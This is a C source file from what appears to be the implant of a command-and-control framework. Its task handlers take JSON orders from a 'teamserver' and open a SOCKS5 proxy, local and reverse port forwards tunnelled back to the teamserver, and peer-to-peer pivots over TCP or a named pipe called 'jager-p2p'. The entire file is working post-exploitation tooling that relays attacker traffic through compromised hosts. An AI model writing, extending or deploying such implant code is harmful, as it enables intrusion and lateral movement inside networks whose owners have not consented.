/**
 * tasks_pivot.c - Task handlers for SOCKS5 and port forwarding
 *
 * Bridges the task dispatcher (JSON payloads from teamserver) to
 * the pivot module APIs (socks.c, portfwd.c). Each handler parses
 * the JSON request_data, calls the pivot API, and writes a status
 * string into the task result.
 *
 * These are fire-and-forget: the SOCKS listener / portfwd listener
 * runs in background threads and survives across checkin cycles.
 */

#include <windows.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"
#include "../../include/pivot.h"
#include "../../include/p2p_relay.h"
#include "../../include/json.h"

/* ---- SOCKS start: {"port": 1080} ---- */

BOOL task_socks_start(BYTE *data, DWORD size, PC2_RESULT result) {
    WORD port = 1080;

    if (data && size > 2) {
        char *json = (char *)data;
        int p = 0;
        if (json_find_int(json, "port", &p) && p > 0 && p < 65536) {
            port = (WORD)p;
        }
    }

    if (socks_get_port() != 0) {
        char msg[128];
        _snprintf(msg, sizeof(msg), "SOCKS already running on port %d", socks_get_port());
        result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
        if (result->data) {
            lstrcpyA((char *)result->data, msg);
            result->data_size = lstrlenA(msg);
        }
        return TRUE;
    }

    if (!socks_start(port)) {
        lstrcpynA(result->error, "socks_start() failed - port may be in use", sizeof(result->error));
        return FALSE;
    }

    char msg[128];
    _snprintf(msg, sizeof(msg), "SOCKS5 started on 127.0.0.1:%d", port);
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- SOCKS stop ---- */

BOOL task_socks_stop(PC2_RESULT result) {
    if (socks_get_port() == 0) {
        const char *msg = "SOCKS not running";
        result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
        if (result->data) {
            lstrcpyA((char *)result->data, msg);
            result->data_size = lstrlenA(msg);
        }
        return TRUE;
    }

    socks_stop();

    const char *msg = "SOCKS stopped";
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- Port forward add: {"local_port":N,"remote_host":"...","remote_port":N} ---- */

BOOL task_portfwd_add(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size < 5) {
        lstrcpynA(result->error, "missing portfwd parameters", sizeof(result->error));
        return FALSE;
    }

    char *json = (char *)data;
    int local_port = 0, remote_port = 0;
    json_find_int(json, "local_port", &local_port);
    json_find_int(json, "remote_port", &remote_port);
    char remote_host[256] = {0};
    json_find_string(json, "remote_host", remote_host, sizeof(remote_host));

    if (local_port <= 0 || remote_port <= 0 || remote_host[0] == 0) {
        lstrcpynA(result->error, "invalid portfwd params: need local_port, remote_host, remote_port",
                  sizeof(result->error));
        return FALSE;
    }

    int fwd_id = portfwd_add("127.0.0.1", local_port, remote_host, remote_port);
    if (fwd_id < 0) {
        lstrcpynA(result->error, "portfwd_add() failed - port may be in use", sizeof(result->error));
        return FALSE;
    }

    char msg[256];
    _snprintf(msg, sizeof(msg), "portfwd #%d: 127.0.0.1:%d -> %s:%d", fwd_id, local_port, remote_host, remote_port);
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- Port forward remove: {"id": N} ---- */

BOOL task_portfwd_remove(BYTE *data, DWORD size, PC2_RESULT result) {
    int fwd_id = -1;

    if (data && size > 2) {
        json_find_int((char *)data, "id", &fwd_id);
    }

    if (fwd_id < 0) {
        lstrcpynA(result->error, "missing or invalid portfwd id", sizeof(result->error));
        return FALSE;
    }

    if (portfwd_remove(fwd_id) != 0) {
        lstrcpynA(result->error, "portfwd not found", sizeof(result->error));
        return FALSE;
    }

    char msg[64];
    _snprintf(msg, sizeof(msg), "portfwd #%d removed", fwd_id);
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- Reverse port forward add: {"lport":N,"rhost":"...","rport":N} ---- */

BOOL task_rportfwd_add(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size < 5) {
        lstrcpynA(result->error, "missing rportfwd parameters", sizeof(result->error));
        return FALSE;
    }

    char *json = (char *)data;
    int lport = 0, rport = 0;
    char rhost[256] = {0};
    json_find_int(json, "lport", &lport);
    json_find_int(json, "rport", &rport);
    json_find_string(json, "rhost", rhost, sizeof(rhost));

    /* Also accept teamserver/MCP field names */
    if (lport <= 0)
        json_find_int(json, "teamserver_port", &lport);
    if (rport <= 0)
        json_find_int(json, "target_port", &rport);
    if (rhost[0] == '\0')
        json_find_string(json, "target_host", rhost, sizeof(rhost));

    if (lport <= 0 || rport <= 0 || rhost[0] == '\0') {
        lstrcpynA(result->error, "invalid rportfwd params: need lport, rhost, rport",
                  sizeof(result->error));
        return FALSE;
    }

    if (!rportfwd_add((WORD)lport, rhost, (WORD)rport)) {
        lstrcpynA(result->error, "rportfwd_add() failed", sizeof(result->error));
        return FALSE;
    }

    char msg[256];
    _snprintf(msg, sizeof(msg), "rportfwd: teamserver:%d -> %s:%d", lport, rhost, rport);
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- Reverse port forward remove: {"lport":N} ---- */

BOOL task_rportfwd_remove(BYTE *data, DWORD size, PC2_RESULT result) {
    int lport = 0;

    if (data && size > 2) {
        json_find_int((char *)data, "lport", &lport);
        if (lport <= 0)
            json_find_int((char *)data, "teamserver_port", &lport);
    }

    if (lport <= 0) {
        lstrcpynA(result->error, "missing or invalid lport", sizeof(result->error));
        return FALSE;
    }

    if (!rportfwd_remove((WORD)lport)) {
        lstrcpynA(result->error, "rportfwd not found", sizeof(result->error));
        return FALSE;
    }

    char msg[64];
    _snprintf(msg, sizeof(msg), "rportfwd port %d removed", lport);
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- P2P Listen: {"pipe_name":"...", "port":N} ---- */

BOOL task_p2p_listen(BYTE *data, DWORD size, PC2_RESULT result) {
    char pipe_name[256] = {0};
    int port = 0;

    if (data && size > 2) {
        char *json = (char *)data;
        json_find_string(json, "pipe_name", pipe_name, sizeof(pipe_name));
        json_find_int(json, "port", &port);
    }

    BOOL ok;
    char msg[256];

    if (port > 0) {
        ok = tcp_pivot_listen((WORD)port);
        if (ok) {
            _snprintf(msg, sizeof(msg), "P2P TCP listener started on port %d", port);
        } else {
            lstrcpynA(result->error, "tcp_pivot_listen() failed", sizeof(result->error));
            return FALSE;
        }
    } else {
        ok = p2p_listen(pipe_name[0] ? pipe_name : NULL);
        if (ok) {
            _snprintf(msg, sizeof(msg), "P2P pipe listener started: %s",
                      pipe_name[0] ? pipe_name : "\\\\.\\pipe\\jager-p2p");
        } else {
            lstrcpynA(result->error, "p2p_listen() failed", sizeof(result->error));
            return FALSE;
        }
    }

    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- P2P Connect: {"target":"...", "pipe_name":"...", "port":N} ---- */

BOOL task_p2p_connect(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size < 5) {
        lstrcpynA(result->error, "missing p2p connect parameters", sizeof(result->error));
        return FALSE;
    }

    char *json = (char *)data;
    char target[256] = {0};
    char pipe_name[256] = {0};
    int port = 0;

    json_find_string(json, "target", target, sizeof(target));
    json_find_string(json, "pipe_name", pipe_name, sizeof(pipe_name));
    json_find_int(json, "port", &port);

    if (target[0] == 0) {
        lstrcpynA(result->error, "missing target host", sizeof(result->error));
        return FALSE;
    }

    BOOL ok;
    char msg[256];

    if (port > 0) {
        ok = tcp_pivot_connect(target, (WORD)port);
        if (ok) {
            _snprintf(msg, sizeof(msg), "P2P TCP connected to %s:%d", target, port);
        } else {
            _snprintf(result->error, sizeof(result->error), "tcp_pivot_connect(%s:%d) failed", target, port);
            return FALSE;
        }
    } else {
        ok = p2p_connect(target, pipe_name[0] ? pipe_name : NULL);
        if (ok) {
            _snprintf(msg, sizeof(msg), "P2P pipe connected to %s\\%s", target,
                      pipe_name[0] ? pipe_name : "jager-p2p");
        } else {
            _snprintf(result->error, sizeof(result->error), "p2p_connect(%s) failed", target);
            return FALSE;
        }
    }

    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}

/* ---- P2P Relay: placeholder for graph-aware routing ---- */

BOOL task_p2p_relay(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size < 3) {
        lstrcpynA(result->error, "missing relay route configuration", sizeof(result->error));
        return FALSE;
    }

    if (!p2p_relay_configure((const char *)data, size)) {
        lstrcpynA(result->error, "p2p_relay_configure() failed", sizeof(result->error));
        return FALSE;
    }

    const char *msg = "P2P relay routes configured";
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, lstrlenA(msg) + 1);
    if (result->data) {
        lstrcpyA((char *)result->data, msg);
        result->data_size = lstrlenA(msg);
    }
    return TRUE;
}
